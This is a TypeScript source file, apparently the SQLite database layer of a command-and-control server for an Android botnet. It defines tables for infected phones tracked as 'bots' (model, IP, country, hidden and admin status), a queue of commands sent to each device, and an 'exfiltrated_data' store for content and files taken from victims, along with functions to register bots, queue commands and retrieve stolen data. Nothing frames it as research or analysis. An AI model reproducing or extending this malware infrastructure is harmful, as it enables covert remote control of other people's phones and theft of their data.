import Database from 'better-sqlite3';
import path from 'path';
import fs from 'fs';
import { config } from './config';
import { BotInfo, StoredCommand, ExfilData } from './types';

let db: Database.Database;

export function initDatabase(): void {
    const dir = path.dirname(config.dbPath);
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }

    db = new Database(config.dbPath);
    db.pragma('journal_mode = WAL');
    db.pragma('foreign_keys = ON');

    db.exec(`
        CREATE TABLE IF NOT EXISTS bots (
            id TEXT PRIMARY KEY,
            phone_model TEXT DEFAULT '',
            android_version TEXT DEFAULT '',
            sdk_level INTEGER DEFAULT 0,
            country TEXT DEFAULT '',
            ip TEXT DEFAULT '',
            first_seen INTEGER DEFAULT (unixepoch()),
            last_seen INTEGER DEFAULT (unixepoch()),
            is_online INTEGER DEFAULT 0,
            battery_level INTEGER DEFAULT 100,
            is_charging INTEGER DEFAULT 1,
            is_hidden INTEGER DEFAULT 0,
            is_admin INTEGER DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            bot_id TEXT NOT NULL,
            command TEXT NOT NULL,
            args TEXT DEFAULT '{}',
            status TEXT DEFAULT 'pending',
            result TEXT DEFAULT '',
            created_at INTEGER DEFAULT (unixepoch()),
            executed_at INTEGER,
            FOREIGN KEY (bot_id) REFERENCES bots(id)
        );

        CREATE TABLE IF NOT EXISTS exfiltrated_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            bot_id TEXT NOT NULL,
            data_type TEXT NOT NULL,
            content TEXT DEFAULT '',
            file_path TEXT DEFAULT '',
            created_at INTEGER DEFAULT (unixepoch()),
            FOREIGN KEY (bot_id) REFERENCES bots(id)
        );

        CREATE INDEX IF NOT EXISTS idx_commands_bot_status ON commands(bot_id, status);
        CREATE INDEX IF NOT EXISTS idx_exfil_bot ON exfiltrated_data(bot_id);
    `);

    console.log('[DB] Database initialized at', config.dbPath);
}

// ─── Bot Operations ───

export function upsertBot(id: string, data: Partial<BotInfo>): void {
    const stmt = db.prepare(`
        INSERT INTO bots (id, phone_model, android_version, sdk_level, country, ip, last_seen, is_online)
        VALUES (@id, @phone_model, @android_version, @sdk_level, @country, @ip, unixepoch(), 1)
        ON CONFLICT(id) DO UPDATE SET
            phone_model = COALESCE(@phone_model, phone_model),
            android_version = COALESCE(@android_version, android_version),
            sdk_level = COALESCE(@sdk_level, sdk_level),
            country = COALESCE(@country, country),
            ip = COALESCE(@ip, ip),
            last_seen = unixepoch(),
            is_online = 1
    `);
    stmt.run({
        id,
        phone_model: data.phoneModel || '',
        android_version: data.androidVersion || '',
        sdk_level: data.sdkLevel || 0,
        country: data.country || '',
        ip: data.ip || '',
    });
}

export function setBotOffline(id: string): void {
    db.prepare('UPDATE bots SET is_online = 0 WHERE id = ?').run(id);
}

export function updateBotBattery(id: string, level: number, charging: boolean): void {
    db.prepare('UPDATE bots SET battery_level = ?, is_charging = ? WHERE id = ?').run(level, charging ? 1 : 0, id);
}

export function updateBotHidden(id: string, hidden: boolean): void {
    db.prepare('UPDATE bots SET is_hidden = ? WHERE id = ?').run(hidden ? 1 : 0, id);
}

export function getBot(id: string): BotInfo | null {
    const row = db.prepare('SELECT * FROM bots WHERE id = ?').get(id) as any;
    if (!row) return null;
    return {
        id: row.id,
        phoneModel: row.phone_model,
        androidVersion: row.android_version,
        sdkLevel: row.sdk_level,
        country: row.country,
        ip: row.ip,
        firstSeen: row.first_seen,
        lastSeen: row.last_seen,
        isOnline: row.is_online === 1,
        batteryLevel: row.battery_level,
        isCharging: row.is_charging === 1,
        isHidden: row.is_hidden === 1,
        isAdmin: row.is_admin === 1,
    };
}

export function getAllBots(): BotInfo[] {
    const rows = db.prepare('SELECT * FROM bots ORDER BY last_seen DESC').all() as any[];
    return rows.map(row => ({
        id: row.id,
        phoneModel: row.phone_model,
        androidVersion: row.android_version,
        sdkLevel: row.sdk_level,
        country: row.country,
        ip: row.ip,
        firstSeen: row.first_seen,
        lastSeen: row.last_seen,
        isOnline: row.is_online === 1,
        batteryLevel: row.battery_level,
        isCharging: row.is_charging === 1,
        isHidden: row.is_hidden === 1,
        isAdmin: row.is_admin === 1,
    }));
}

export function getOnlineBots(): BotInfo[] {
    return getAllBots().filter(b => b.isOnline);
}

export function getBotCount(): { total: number; online: number } {
    const total = (db.prepare('SELECT COUNT(*) as c FROM bots').get() as any).c;
    const online = (db.prepare('SELECT COUNT(*) as c FROM bots WHERE is_online = 1').get() as any).c;
    return { total, online };
}

// ─── Command Operations ───

export function createCommand(botId: string, command: string, args: Record<string, any> = {}): StoredCommand {
    const result = db.prepare(
        'INSERT INTO commands (bot_id, command, args) VALUES (?, ?, ?)'
    ).run(botId, command, JSON.stringify(args));

    return {
        id: result.lastInsertRowid as number,
        botId,
        command,
        args: JSON.stringify(args),
        status: 'pending',
        result: '',
        createdAt: Math.floor(Date.now() / 1000),
        executedAt: null,
    };
}

export function getPendingCommands(botId: string): StoredCommand[] {
    const rows = db.prepare(
        'SELECT * FROM commands WHERE bot_id = ? AND status = ? ORDER BY id ASC'
    ).all(botId, 'pending') as any[];

    return rows.map(r => ({
        id: r.id,
        botId: r.bot_id,
        command: r.command,
        args: r.args,
        status: r.status,
        result: r.result,
        createdAt: r.created_at,
        executedAt: r.executed_at,
    }));
}

export function updateCommandStatus(id: number, status: string, result: string = ''): void {
    db.prepare(
        'UPDATE commands SET status = ?, result = ?, executed_at = unixepoch() WHERE id = ?'
    ).run(status, result, id);
}

export function getCommand(id: number): StoredCommand | null {
    const row = db.prepare('SELECT * FROM commands WHERE id = ?').get(id) as any;
    if (!row) return null;
    return {
        id: row.id,
        botId: row.bot_id,
        command: row.command,
        args: row.args,
        status: row.status,
        result: row.result,
        createdAt: row.created_at,
        executedAt: row.executed_at,
    };
}

// ─── Exfiltrated Data ───

export function storeExfil(botId: string, dataType: string, content: string, filePath: string = ''): void {
    db.prepare(
        'INSERT INTO exfiltrated_data (bot_id, data_type, content, file_path) VALUES (?, ?, ?, ?)'
    ).run(botId, dataType, content.slice(0, 100000), filePath);
}

export function getExfilData(botId: string, dataType?: string): ExfilData[] {
    let query = 'SELECT * FROM exfiltrated_data WHERE bot_id = ?';
    const params: any[] = [botId];
    if (dataType) {
        query += ' AND data_type = ?';
        params.push(dataType);
    }
    query += ' ORDER BY created_at DESC LIMIT 100';
    const rows = db.prepare(query).all(...params) as any[];
    return rows.map(r => ({
        id: r.id,
        botId: r.bot_id,
        dataType: r.data_type,
        content: r.content,
        filePath: r.file_path,
        createdAt: r.created_at,
    }));
}

// ─── Cleanup ───

export function closeDatabase(): void {
    if (db) db.close();
}
